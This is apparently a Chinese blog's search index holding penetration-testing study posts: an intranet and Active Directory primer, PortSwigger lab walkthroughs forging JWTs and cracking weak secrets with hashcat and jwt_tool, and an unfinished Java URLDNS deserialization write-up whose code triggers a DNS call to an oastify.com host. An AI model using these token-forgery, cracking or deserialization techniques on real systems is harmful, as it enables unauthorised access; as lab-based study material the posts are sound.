<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>内网渗透-简介</title>
    <link href="/2023/11/20/2023-11-20-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2023/11/20/2023-11-20-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>你每天总是在计较失去了什么，得到了什么，比别人多得到了什么，比别人少获得了什么，你怎么会觉得这个世界是单纯且美好的呢。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>&emsp;&emsp;画个饼先，大概会花上两个月来更新这部分的基础理论，等换了新电脑，会更新一些靶场的内容，一起期待一下吧！</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>&emsp;&emsp;内网也叫局域网，是指在某一区域由多台计算机互相连接而成的计算机组。内网的情况往往比较复杂。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>&emsp;&emsp;在一个大型单位中，可能存在着成百上千台计算机，他们相互连接组成局域网，如果不对它们进行分组，那么网络关系就会杂乱不堪，工作组的出现，成功解决了这个问题。它将局域网中不同的计算机按功能分别列入不同的工作组，使网络更有序。</p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>&emsp;&emsp;域是一台有安全边界的计算机集合（这里的安全边界指的是在两个域中，一个域中的用户无法访问另外一个域中的资源），更像是一个升级版的工作组。用户想要访问域内的资源，必须以合法的身份登录域，用户对域内的资源拥有什么样的权限，取决于用户在域内的身份。</p><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>&emsp;&emsp;DC（domain controller），域控制器是域中一台类似管理服务器的主机，它拥有管理域内其他主机的计算机权限，它负责所有本域内的计算和用户的验证工作，它是整个域的通信枢纽，域内所有用来验证身份的账号和密码哈希都存在域控制器中。所以，内网渗透的最终目标常常就是为了攻下域控服务器，即拿域控。</p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>&emsp;&emsp;就是指只有一个域环境的网络，这里需要说明的是，一般在一个域中，至少会有两台域服务，一台作为DC，另一台作为备份DC。（没有把握的时候先日备用的，为自己争取跑路时间）</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>&emsp;&emsp;当存在多个域时，第一个域称为父域，各分部的域称为该域的子域。设置这样的模式的好处：</p><p>1.减小了域之间信息交互的压力（域内信息交互不会压缩，域间信息交互可压缩）</p><p>2.不同的子域可以指定特定的安全策略</p><p><font color="red">&emsp;&emsp;父域中域名使用一个.表示一个层次，放在域名最后的子域称为最高级子域或一级子域，它面前的称为二级域</font></p><p>&emsp;&emsp;如果baidu.com是一个父域，那么abc.baidu.com就是一级子域，aa.abc.baidu.com就是二级域。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>&emsp;&emsp;域树时多个域通过建立信任关系组成的集合。当两个域内需要互相访问时，就需要建立信任关系。建立信任关系后，可以将父子域连接成树状格式，此时就可以实现互相访问。</p><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>&emsp;&emsp;域森林是指多个<em>域树</em>通过建立信任关系组成的集合。例如，当前域树aaa.net和域树aaa.com，两个本来是无法实现相互访问的，而当两个域树建立信任关系后，他们可以组成一个集合形式（域森林），实现相互访问。</p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>&emsp;&emsp;<strong>域名服务器（Domian Name Server，简称DNS）是指用于实现域名和与之对应IP地址转换的服务器。简单的说，就是实现域名到IP地址的转换。</strong>同时，域的名字就是DNS的名字，因为域中计算机使用DNS来定位DC、服务器等计算机。</p><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>&emsp;&emsp;<strong>活动目录（Active Directory，简称AD）</strong>是指与环境中提供目录服务的组件。</p><p>&emsp;&emsp;它用于存储有关网络对象（用户、组、计算机、共享资源等）的信息，目录服务是指帮助用户快速、准确地寻找其所需要的服务。为企业提供了网络环境的集中式管理机制。</p><p>&emsp;&emsp;活动目录的逻辑结构包括阻止单元（ou）、域、域树、域森林。逻辑结构的定义是不考虑被管理对象的具体位置的阻止框架。</p><p>&emsp;&emsp;活动目录的功能</p><p><font color="green">1.账号集中管理：所有账号均存储在服务器中，以便执行命令和重置密码等。<br></font></p><p><font color="green">2.软件集中管理：统一推送软件，安装打印机等。利用软件发布策略分部软件，可以让用户自由选择需要安装的软件。<br></font></p><p><font color="green">3.环境集中管理：统一客户端桌面、IE、TCP&#x2F;IP协议等设置。<br></font></p><p><font color="green">4.增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一指定密码策略等。<br></font></p><p><font color="green">5.更可靠、更短的宕机时间：例如，利用活动目录控制用户访问权限，利用集群、负载均衡等技术对文件服务器进行容灾设置<br></font></p><h3 id="域控与活动目录的区别"><a href="#域控与活动目录的区别" class="headerlink" title="域控与活动目录的区别"></a>域控与活动目录的区别</h3><p>&emsp;&emsp;活动目录数据库，即拥有层次结构的数据库，简称AD库。</p><p>&emsp;&emsp;要实现域环境，其实就是要安装AD库。如果内网中一台计算机上安装了AD，那它就变成了<strong>DC（用于存储活动目录数据库的计算机，即域控）</strong></p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>&emsp;&emsp;在一个用路由器连接的内网中，可以将网络划分为三个区域：内网、DMZ、外网</p><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><p>&emsp;&emsp;内网，拥有两个区：</p><p>1.核心区（存储企业最重要的数据、文档等信息资产，往往只有很少的主机能访问）。</p><p>2.办公区（公司员工日常的工作区，一般能够访问DMZ，部分主机可访问核心区）</p><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>&emsp;&emsp;DMZ（Demilitarized Zone，称为隔离区），其是一个非安全系统与安全系统之间的缓冲区，也就是说，DMZ一般位于内网和外部网络之间。这里主要用于对外提供服务，可以在此放置一些必须公开的服务器设施，例如企业Web服务器、FTP服务器和论坛服务器等。</p><h4 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h4><p>&emsp;&emsp;互联网，安全级别最低。</p><h4 id="三者的关系"><a href="#三者的关系" class="headerlink" title="三者的关系"></a>三者的关系</h4><p>&emsp;&emsp;在配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略，以实现屏障功能。</p><p><font color="red">1.内网可以访问外网：内网用户需要自由地访问外网<br></font></p><p><font color="red">2.内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器<br></font></p><p><font color="red">3.外网不能访问内网：内网中存储的是公司内部数据，这些数据一般是不允许外网用户访问的（如果要访问，可以通过VPN的方式进行）<br></font></p><p><font color="red">4.外网可以访问DMZ：因为DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ<br></font></p><p><font color="red">5.DMZ不能访问内网：如果不执行此策略，当攻击者攻陷DMZ时，内网将无法受到保护<br></font></p><p><font color="red">6.DMZ不能访问外网：此策略也有例外。如果DMZ区存在邮件服务器等就需要访问外网，否则无法正常工作<br></font></p><p>&emsp;&emsp;可是实际情况真的像上面所列举的这么理想化吗？</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jwt（三）</title>
    <link href="/2023/10/27/2023-10-27-jwt/"/>
    <url>/2023/10/27/2023-10-27-jwt/</url>
    
    <content type="html"><![CDATA[<p>所爱如明月，触手不可得。</p><h1 id="Java-Web-Token"><a href="#Java-Web-Token" class="headerlink" title="Java Web Token"></a>Java Web Token</h1><p>渗透文章参考：<a href="https://xz.aliyun.com/t/12906#toc-1">https://xz.aliyun.com/t/12906#toc-1</a></p><p>继续靶场</p><h3 id="通过弱签名密钥绕过JWT身份验证"><a href="#通过弱签名密钥绕过JWT身份验证" class="headerlink" title="通过弱签名密钥绕过JWT身份验证"></a>通过弱签名密钥绕过JWT身份验证</h3><p>&emsp;&emsp;前面的一些操作基本都是相同的，而这一个根据名称也能够了解到，需要我们对密钥进行破解，而一般的方式就是暴力破解。我们直接抓一个token去了解这种攻击方式。</p><p><img src="/2023/10/27/2023-10-27-jwt/image.png" alt="身份认证"></p><p>&emsp;&emsp;字典，搞里头：<a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</a></p><h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>&emsp;&emsp;hashcat搞里头：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#命令格式：</span><br><span class="hljs-attribute">hashcat</span> -a <span class="hljs-number">0</span> -m <span class="hljs-number">16500</span> &lt;jwt&gt; &lt;wordlist&gt;<br><br><span class="hljs-comment">#执行示例：</span><br><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">16500</span> jwt.txt -a <span class="hljs-number">0</span> secrets.txt --force<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;跑出来了，这个就是对的</p><p><img src="/2023/10/27/2023-10-27-jwt/image-1.png" alt="结果"></p><h4 id="jwt-tool"><a href="#jwt-tool" class="headerlink" title="jwt_tool"></a>jwt_tool</h4><p>&emsp;&emsp;工具，搞里头：<a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p><p>&emsp;&emsp;依赖，搞里头：pip3 install -r .\requirements.txt</p><p>&emsp;&emsp;用法自己看，这里直接说怎么跑</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> .\jwt_tool.py eyJraWQiOiJhOGU<span class="hljs-number">0</span>OGU<span class="hljs-number">1</span>My<span class="hljs-number">0</span>yMzE<span class="hljs-number">4</span>LTQ<span class="hljs-number">0</span>OGItOTk<span class="hljs-number">5</span>Zi<span class="hljs-number">1</span>jY<span class="hljs-number">2</span>Y<span class="hljs-number">1</span>ZjU<span class="hljs-number">2</span>MTAyMGEiLCJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span>.eyJpc<span class="hljs-number">3</span>MiOiJwb<span class="hljs-number">3</span>J<span class="hljs-number">0</span>c<span class="hljs-number">3</span>dpZ<span class="hljs-number">2</span>dlciIsI<span class="hljs-symbol">nN1</span>YiI<span class="hljs-number">6</span>I<span class="hljs-symbol">ndpZW5</span>lciIsImV<span class="hljs-number">4</span>cCI<span class="hljs-number">6</span>MTY<span class="hljs-number">5</span>ODYz<span class="hljs-symbol">NzA1</span><span class="hljs-symbol">NH0</span>.tt_<span class="hljs-attr">VSJSSaiVrVqX3</span>i<span class="hljs-symbol">NmJksizg3</span>xCiQ<span class="hljs-number">8</span>KJRDTfvHz<span class="hljs-number">9</span>jU -C -d .\jwt-secrets.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/10/27/2023-10-27-jwt/image-2.png" alt="jwt_tool结果"></p><p>&emsp;&emsp;后面还有一些其他的方法像头部注入、算法混淆等可以去看参考文章，这些可能在很久以后才会加入到文章里面，本系列只是对原文章的一些简化，如果想要详细了解，参考：<a href="https://xz.aliyun.com/t/12906#toc-1">https://xz.aliyun.com/t/12906#toc-1</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jwt（二）</title>
    <link href="/2023/10/25/2023-10-25-jwt/"/>
    <url>/2023/10/25/2023-10-25-jwt/</url>
    
    <content type="html"><![CDATA[<p>你会遇到比我更有趣的人，然后在晚霞黄昏后渐渐忘了我。</p><h1 id="Java-Web-Token"><a href="#Java-Web-Token" class="headerlink" title="Java Web Token"></a>Java Web Token</h1><p>渗透文章参考：<a href="https://xz.aliyun.com/t/12906#toc-1">https://xz.aliyun.com/t/12906#toc-1</a></p><h2 id="常见的渗透姿势"><a href="#常见的渗透姿势" class="headerlink" title="常见的渗透姿势"></a>常见的渗透姿势</h2><p>下面的标题都是百度翻译的，抽象与我无关</p><h3 id="1-通过未验证的签名绕过JWT身份验证"><a href="#1-通过未验证的签名绕过JWT身份验证" class="headerlink" title="1.通过未验证的签名绕过JWT身份验证"></a>1.通过未验证的签名绕过JWT身份验证</h3><p>&emsp;&emsp;靶场地址：<a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature</a></p><p>&emsp;&emsp;写了一大堆，TM看不懂，大致意思就是我们有一个账户，然后需要通过admin接口删除carlos这个账号，开整。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-7.png" alt="靶场任务"></p><p>&emsp;&emsp;通过账号密码wiener:peter进行登录抓包。<br><img src="/2023/10/25/2023-10-25-jwt/image.png" alt="登录"></p><p>&emsp;&emsp;在数据包中可以看到JWT，尝试直接修改payload验证签名是否会对信息原始性进行校验。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-1.png" alt="获取jwt"></p><p>&emsp;&emsp;直接将用户名修改为admin进行测试，发现签名不会对信息原始性进行校验。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-2.png" alt="解码jwt"></p><p><img src="/2023/10/25/2023-10-25-jwt/image-4.png" alt="伪造jwt"></p><p>&emsp;&emsp;直接调用admin接口（在这里发现只有administrator账户才有权限，注意进行更改），发现存在删除接口，直接删除账户，成功删除。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-5.png" alt="找到接口"></p><p><img src="/2023/10/25/2023-10-25-jwt/image-6.png" alt="调用接口"></p><h3 id="2-JWT通过有缺陷的签名验证绕过身份验证"><a href="#2-JWT通过有缺陷的签名验证绕过身份验证" class="headerlink" title="2.JWT通过有缺陷的签名验证绕过身份验证"></a>2.JWT通过有缺陷的签名验证绕过身份验证</h3><p>&emsp;&emsp;写了一大堆，TM和上一个一样。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-8.png" alt="实验目标"></p><p>&emsp;&emsp;这里大概意思就是让我们把header中的alg参数改为none,然后不让它验证签名。（说到alg最近碰到了关于nacos加密的问题，后面扩展更多的算法之后可以简单说一说）。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-9.png" alt="实验tips"></p><p>&emsp;&emsp;登录、抓包、拿jwt、解jwt，将alg改为none，将账户改为administrator。</p><p><img src="/2023/10/25/2023-10-25-jwt/image-10.png" alt="获取jwt"></p><p><img src="/2023/10/25/2023-10-25-jwt/image-11.png" alt="解码伪造"></p><p>&emsp;&emsp;不让它验证签名直接把签名删除即可，成功绕过，这里有需要注意不要把.删了，否则不是一个完整的JWT，无法绕过。（实验完成部分如果重复的情况下不再截图）</p><p><img src="/2023/10/25/2023-10-25-jwt/image-13.png" alt="成功伪造"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jwt（一）</title>
    <link href="/2023/10/21/2023-10-21-jwt/"/>
    <url>/2023/10/21/2023-10-21-jwt/</url>
    
    <content type="html"><![CDATA[<p>而我们又是谁的故事中的甲乙丙丁呢？</p><h1 id="Java-Web-Token"><a href="#Java-Web-Token" class="headerlink" title="Java Web Token"></a>Java Web Token</h1><p>&emsp;&emsp;JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p><p>&emsp;&emsp;jwt网址：<a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>&emsp;&emsp;通俗地说，JWT的本质就是一个字符串，用来验证用户身份。</p><p>&emsp;&emsp;了解详情参考：<a href="https://www.cnblogs.com/zhuangzilian/p/15911689.html">https://www.cnblogs.com/zhuangzilian/p/15911689.html</a></p><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>&emsp;&emsp;本身的介绍是比较抽象的，但是了解其不同的构造方式也是有利于我们进行渗透。</p><p>&emsp;&emsp;下面是jwt本身的结构</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-number">1</span>&gt; <br><span class="hljs-function"><span class="hljs-title">base64</span><span class="hljs-params">(header)</span></span><span class="hljs-selector-class">.base64</span>(payload)<br>&lt;<span class="hljs-number">2</span>&gt;<br><span class="hljs-function"><span class="hljs-title">base64</span><span class="hljs-params">(header)</span></span><span class="hljs-selector-class">.base64</span>(payload)<span class="hljs-selector-class">.HMACSHA256</span>(<span class="hljs-built_in">base64urlencode</span>(header)+<span class="hljs-string">&quot;.&quot;</span>+<span class="hljs-built_in">base64urlencode</span>(payload)+secret)<br></code></pre></td></tr></table></figure><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>&emsp;&emsp;Header包含了JWT使用的算法和类型等元数据信息，通常使用JSON对象表示并使用Base64编码，Header中包含两个字段：alg和typ<br>alg(algorithm)：指定了使用的加密算法，常见的有HMAC、RSA和ECDSA等算法<br>typ(type)：指定了JWT的类型，通常为JWT</p><p>&emsp;&emsp;下面是一个示例Header：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;其中alg指定了使用HMAC-SHA256算法进行签名，typ指定了JWT的类型为JWT</p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>&emsp;&emsp;Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64编码，Payload中包含三个类型的字段：注册声明、公共声明和私有声明</p><p>&emsp;&emsp;公共声明(Public Claims)：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等<br>&emsp;&emsp;私有声明(Private Claims)：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等<br>&emsp;&emsp;注册声明(Registered Claims)：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等<br>&emsp;&emsp;下面是一个示例Payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1516239022</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;其中sub表示主题，name表示名称，iat表示JWT的签发时间</p><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>&emsp;&emsp;Signature是使用指定算法对Header和Payload进行签名生成的，用于验证JWT的完整性和真实性，Signature的生成方式通常是将Header和Payload连接起来然后使用指定算法对其进行签名，最终将签名结果与Header和Payload一起组成JWT，Signature的生成和验证需要使用相同的密钥，下面是一个示例Signature</p><p>&emsp;&emsp;HMACSHA256(base64UrlEncode(header) + “.” +base64UrlEncode(payload),secret)<br>其中HMACSHA256是使用HMAC SHA256算法进行签名，header和payload是经过Base64编码的Header和Payload，secret是用于签名和验证的密钥，最终将Header、Payload和Signature连接起来用句点(.)分隔就形成了一个完整的JWT，下面是一个示例JWT，其中第一部分是Header，第二部分是Payload，第三部分是Signature，注意JWT 中的每一部分都是经过Base64编码的，但并不是加密的，因此JWT中的信息是可以被解密的</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJzdWIiOiIxMj<span class="hljs-name">M0</span><span class="hljs-symbol">NTY3</span>ODkwIiwibmFtZSI<span class="hljs-number">6</span>Ikpva<span class="hljs-name">G4</span>gR<span class="hljs-name">G9</span>lIiwiaWF<span class="hljs-number">0</span>Ijox<span class="hljs-symbol">NTE2</span>Mj<span class="hljs-name">M5</span>MDIyfQ.SflKxwRJSMeKKF<span class="hljs-number">2</span>QT<span class="hljs-number">4</span>fwpMeJf<span class="hljs-number">36</span>POk<span class="hljs-number">6</span>yJV_adQssw<span class="hljs-number">5</span>c<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;从本身的结构中我们可以看到，如果只是通过简单的base64拼接我们很容易就可以伪造其token，但是如果采用了第二种方式则对数据进行了校验，可能就需要一些复杂的步骤来进行身份伪造。</p><p>&emsp;&emsp;下面是jwt的官网所给我们提供的图片，通过这张图片很容易就可以看出详细结构。</p><p><img src="/2023/10/21/2023-10-21-jwt/image.png" alt="jwt"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS链</title>
    <link href="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/"/>
    <url>/2023/10/20/2023-10-20-URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>凌晨四点，我看见海棠花未眠。</p><h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>&emsp;&emsp;这是一条比较简单的利用链，本身不利用外部依赖，因此基本不受版本和环境的限制。但是这条利用链也只能做到发起DNS请求，因此常用于验证反序列化漏洞的存在与否。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>&emsp;&emsp;在任意类中敲一个URL，按住ctrl单击，进入URL类，在URL类中可以找到hashCode方法，当hashCode的值为-1时，进入handler下的hashCode方法，我们按住ctrl单击进入该方法。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image.png" alt="hashCode"></p><p>&emsp;&emsp;在这个地方会通过getHostAddress发起DNS请求。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-1.png" alt="域名解析方法"></p><p>&emsp;&emsp;但是需要注意的是，hashCode的默认初始值为-1</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-2.png" alt="hashCode默认值"></p><p>&emsp;&emsp;再分析入口类hashmap，这个类重写了readObject方法，且参数类型宽泛，支持反序列化操作，是一个优秀的入口类。在readObject下的putVal中调用了hash方法，我们继续跟入hash方法。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-3.png" alt="入口类"></p><p>&emsp;&emsp;当key不为空时调用hashCode，完成整条链的利用。但是在这个地方存在着一个疑问，在我们代码执行逻辑中调用的是URL下的hashCode方法，可是当我们ctrl+单击时进入的是Object下的hashCode，希望能够碰到大佬进行解答。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-4.png" alt="hash方法"></p><p>&emsp;&emsp;这时理论上我们只要创建一个HashMap，并且向其中传入一个url就可以完成代码。接下来编写代码进行实际测试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://h4m6mmyf3qswqpzegyzic3i8rzxple.oastify.com&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object, Object&gt;();<br>        hashap.put(url, <span class="hljs-number">333</span>);<br>        Serialize(hashap);<br>        <span class="hljs-comment">//unSerialize(new File(&quot;ser.bin&quot;));</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unSerialize</span><span class="hljs-params">(File filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;运行代码进行测试，将序列化和反序列化的过程分开，运行我们可以发现，实际情况下在序列化的过程中会直接发起请求，反序列化的过程中则不会发起请求，继续分析代码。（多次重复实验请注意更新DNS地址和删除ser.bin文件）</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-5.png" alt="序列化"></p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-6.png" alt="反序列化"></p><p>&emsp;&emsp;跟进hashmap.put我们会发现，当我们调用put的时候就已经调用hash方法发起DNS请求，因此在我们反序列化的过程中则不会再发起请求。因此我们需要在序列化的过程中避免发起请求，在前面我们已经知道可以通过hashCode的值来影响代码执行的流程，可是hashCode默认初始为-1，这就需要我们在上一节中提到的反射来进行修改，整个流程如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://dnslog&quot;</span>);<br>HashMap&lt;Object, Object&gt; hashap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object, Object&gt;();<br><span class="hljs-comment">//在这里，我们让hashCode的值不为-1，防止序列化发起DNS</span><br>hashap.put(url, <span class="hljs-number">333</span>);<br><span class="hljs-comment">//在这里再修改回-1，让反序列化发起DNS请求</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;重新修改代码逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 